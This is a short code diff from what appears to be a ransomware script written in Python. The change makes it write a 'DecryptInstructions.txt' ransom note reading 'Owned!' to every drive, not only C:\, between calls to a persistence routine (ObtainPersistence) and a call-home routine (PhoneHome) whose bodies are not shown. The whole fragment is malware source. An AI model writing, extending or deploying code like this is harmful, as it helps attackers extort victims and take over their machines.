@@ -181,7 +181,12 @@ if __name__ == '__main__':
 			
 	ObtainPersistence()
 	
-	with open('C:\\DecryptInstructions.txt', 'w+') as DecryptInstructions:
-		DecryptInstructions.write('Owned!')
-	
+	for drive in drives:
+		DecryptInstructions = os.path.join(drive, 'DecryptInstructions.txt')
+		try:
+			with open(DecryptInstructions, 'w+') as file:
+				file.write('Owned!')
+		except:
+			pass
+			
 	PhoneHome()
